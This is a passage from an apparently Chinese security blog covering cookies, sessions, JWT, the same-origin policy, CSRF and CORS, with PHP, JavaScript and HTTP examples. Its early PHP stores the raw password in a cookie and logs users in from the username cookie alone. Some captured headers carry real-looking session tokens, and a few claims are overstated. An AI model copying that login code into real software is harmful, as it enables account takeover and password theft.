1</span></span><br></pre></td></tr></table></figure><p>可以看到cookie中携带者有关用户登录的信息，因为我们在设置cookie的时候cookie有效性为7天。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;username&quot;</span>,$username,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); </span><br><span class="line">setcookie(<span class="string">&quot;code&quot;</span>,$password,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); </span><br></pre></td></tr></table></figure><p>最后我们直接访问index.php发现可以不用输入密码账户即可登录成功，原因就是cookie已经存在于本地，并且有效时间为7天。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201119144130981.png" alt="image-20201119144130981"></p><p>而且我们在index页面中对cookie中的内容进行了判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"> $_SESSION[<span class="string">&#x27;username&#x27;</span>]=$_COOKIE[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"> $_SESSION[<span class="string">&#x27;islogin&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="session与cookie的区别"><a href="#session与cookie的区别" class="headerlink" title="session与cookie的区别"></a>session与cookie的区别</h2><p>Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器</p><p>网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。</p><p>cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。</p><p>服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。</p><p>cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的</p><p>session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。</p><p>1、存储方式不同</p><p>Cookie中只能保管ASCII字符串</p><p>Session中能够存取任何类型的数据</p><p>2、隐私策略的不同</p><p>Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。</p><p>Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险</p><p>3、跨域支持上的不同</p><p>Cookie支持跨域名访问</p><p>Session仅在他所在的域名内有效</p><p>4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的；</p><p>5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session；</p><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE；</p><p>6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K；</p><h2 id="什么是cookie？"><a href="#什么是cookie？" class="headerlink" title="什么是cookie？"></a>什么是cookie？</h2><p>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，实际上Cookie是服务器在<strong>本地机器</strong>上存储的一小段文本，并随着每次请求发送到服务器。</p><h3 id="cookie如何生成？"><a href="#cookie如何生成？" class="headerlink" title="cookie如何生成？"></a>cookie如何生成？</h3><p>1、由服务端生成，在返回包中的set-cookie选项设置cookie。</p><p>2、前端浏览器通过js设置cookie。</p><h2 id="什么是session？"><a href="#什么是session？" class="headerlink" title="什么是session？"></a>什么是session？</h2><p>Session 代表着服务器和客户端一次会话的过程，Session 对象存储特定用户会话所需的属性及配置信息。</p><p>客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。</p><h3 id="session的缺陷"><a href="#session的缺陷" class="headerlink" title="session的缺陷"></a>session的缺陷</h3><ul><li>session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</li><li>cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</li></ul><h3 id="session与cookie的关系"><a href="#session与cookie的关系" class="headerlink" title="session与cookie的关系"></a>session与cookie的关系</h3><p>用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建创建对应的 Session ，请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器，浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名。</p><p>当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。</p><p>根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。</p><h2 id="什么是JWT？"><a href="#什么是JWT？" class="headerlink" title="什么是JWT？"></a>什么是JWT？</h2><h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><p>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature)。</p><p>header</p><p>jwt的头部承载两部分信息：</p><ul><li>声明类型，这里是jwt</li><li>声明加密的算法 通常直接使用 HMAC SHA256</li></ul><p>完整的头部就像下面这样的JSON：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#39;typ&#39;: &#39;JWT&#39;,</span><br><span class="line">  &#39;alg&#39;: &#39;HS256&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure><p>playload</p><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li>标准中注册的声明</li><li>公共的声明</li><li>私有的声明</li></ul><p>标准中注册的声明 (建议但不强制使用) ：</p><ul><li><strong>iss</strong>: jwt签发者</li><li><strong>sub</strong>: jwt所面向的用户</li><li><strong>aud</strong>: 接收jwt的一方</li><li><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</li><li><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</li><li><strong>iat</strong>: jwt的签发时间</li><li><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</li></ul><p>公共的声明 ：<br> 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p><p>私有的声明 ：<br> 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><p>定义一个payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure><p>signature</p><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">&#x27;.&#x27;</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">&#x27;secret&#x27;</span>); <span class="comment">// TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>将这三部分用<code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</strong></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201119144914097.png" alt="image-20201119144914097"></p><h3 id="JWT优点"><a href="#JWT优点" class="headerlink" title="JWT优点"></a>JWT优点</h3><ul><li>JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。</li><li>jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。</li><li>不需要在服务端保存会话信息, 所以它易于应用的扩展</li></ul><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。</li><li>保护好secret私钥，该私钥非常重要。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie与Session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略与CSP</title>
      <link href="2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/"/>
      <url>2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/</url>
      
        <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h5 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域?"></a>什么是跨域?</h5><p>域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界</p><p>只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。</p><p>网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。</p><h5 id="同源策略-1"><a href="#同源策略-1" class="headerlink" title="同源策略"></a>同源策略</h5><p>同源是指域名、协议、端口相同</p><p>浏览器的同源策略主要有两个:</p><p>DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现</p><p>XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求</p><p>存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问</p><h5 id="Dom-同源策略"><a href="#Dom-同源策略" class="headerlink" title="Dom 同源策略"></a>Dom 同源策略</h5><p>Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。</p><p>我们来看一个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现,他拒绝了支付宝页面的展示,原因是没有设置请求头---x-frame-options,主要原因就是不同源(sameorigin)/">www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin)</a></p><p><code>X-Frame-Options</code> 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY     &#x2F;&#x2F; 不允许iframe</span><br><span class="line">X-Frame-Options: SAMEORIGIN   &#x2F;&#x2F; 只允许同源的网站iframe</span><br><span class="line">X-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F)  &#x2F;&#x2F; 只允许指定网站iframe</span><br></pre></td></tr></table></figure><h5 id="XMLHttpRequest-同源策略"><a href="#XMLHttpRequest-同源策略" class="headerlink" title="XMLHttpRequest 同源策略"></a>XMLHttpRequest 同源策略</h5><p>XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造</p><p>跨站请求原理:</p><p>1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中</p><p>2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息</p><p>去执行一些非法操作</p><p>3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的</p><h5 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h5><h6 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h6><p>具体流程</p><ul><li>当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。</li></ul><p>请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。</p><h6 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h6><p>具体流程</p><ul><li>在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址</li><li>将该地址附加到referrer域中</li></ul><p>判断请求头中的Referer字段，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /pheapi/article/dir/<span class="number">89489609</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: blog.csdn.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json, text/javascript, */*; q=<span class="number">0.01</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://blog.csdn.net/qq_36119192/article/details/<span class="number">89489609</span></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">X-Tingyun-Id: im-pGljNfnc;r=<span class="number">901833252</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>以上场景出现在用户从<code>https://blog.csdn.net/qq_36119192/article/details/89489609</code>访问<code>/pheapi/article/dir/89489609</code>，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。</p><h6 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h6><p>origin只有发生跨域请求或者同域的post请求时候才会有。</p><p>referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。</p><p>补天平台登录请求头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1</span><br><span class="line">Host: user.butian.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=UTF<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">208</span></span><br><span class="line">//可以看到referer没有带上path和query</span><br><span class="line">Origin: https://user.butian.net</span><br><span class="line">Connection: close</span><br><span class="line">Referer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1</span><br><span class="line">Cookie: next=<span class="string">&quot;https%3A//www.butian.net/login.html&quot;</span>; __q__=<span class="number">1601903202954</span>; csrf_token=<span class="number">1601906836</span><span class="comment">##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27</span></span><br></pre></td></tr></table></figure><h5 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h5><h5 id="CORS-跨域解决"><a href="#CORS-跨域解决" class="headerlink" title="CORS 跨域解决"></a>CORS 跨域解决</h5><p>它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能同源使用的限制。</p><p>实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。</p><p>CORS的原理:</p><p>使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问</p><h5 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h5><h6 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h6><p>必须<code>同时满足</code>以下两个条件的请求，才是简单请求</p><p>请求方法只能是在以下三种之中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">POST</span><br><span class="line">HEAD</span><br></pre></td></tr></table></figure><p>HTTP的头信息不超出以下几种字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><h6 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>在发送真正请求之前，会先发送一次<code>预检</code>请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用<code>真实请求方法</code>发起请求</p><p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p><p>除了<code>Origin</code>字段，”预检”请求的头信息包括两个特殊字段。</p><ul><li><p>Access-Control-Request-Method</p><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p></li><li><p>Access-Control-Request-Headers</p><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p></li></ul><h5 id="三个与CORS请求相关的字段"><a href="#三个与CORS请求相关的字段" class="headerlink" title="三个与CORS请求相关的字段"></a>三个与CORS请求相关的字段</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><h6 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h6><p>该字段是必须的，它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p><h6 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h6><p>该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。</p><h6 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a>Access-Control-Expose-Headers</h6><p>该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><h6 id="简单请求-1"><a href="#简单请求-1" class="headerlink" title="简单请求"></a>简单请求</h6><p>两个网站—<a href="http://www.siam.com和www.siam2.com/">www.siam.com和www.siam2.com</a> sim向sim2发起请求 </p><p>sim网站如下,使用ajax请求sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是原始页面的内容<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>访问sim2的时候:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</span><br></pre></td></tr></table></figure><p>很明显不允许进行跨域</p><p>因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置:</p><p><strong>响应头中增加字段，来添加信任站点的域名</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">header</span>(&#x27;<span class="attr">Access-Control-Allow-Origin:http:</span>//<span class="attr">www.siam.com</span>&#x27;);</span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>这里就跨域请求成功了。</p><h6 id="非简单请求-1"><a href="#非简单请求-1" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用<code>PUT</code>方法来测试就可以出现<code>非简单请求</code>的场景了。<br> 当然你也可以自定义HTTP头部来实现非简单请求。</p><p>我们把index.html的ajax方法改为<code>put</code> 然后请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : &quot;http://www.siam2.com/index2.php&quot;,</span><br><span class="line">    type: &quot;PUT&quot;,</span><br><span class="line">    success:function(res)&#123;</span><br><span class="line">        